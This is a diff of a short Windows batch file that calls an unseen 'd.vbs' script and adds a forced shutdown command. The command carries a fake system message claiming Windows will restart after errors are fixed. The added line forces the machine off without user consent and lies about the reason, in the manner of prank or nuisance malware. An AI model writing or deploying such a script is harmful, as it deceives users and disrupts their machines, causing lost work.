@@ -1,6 +1,6 @@
 @echo off
 call d.vbs
-
+shutdown /s /t 15  /c "The Windows operating system will be started after the errors in the system are fixed. " /f /d p:4:1
 
 :A
 :1
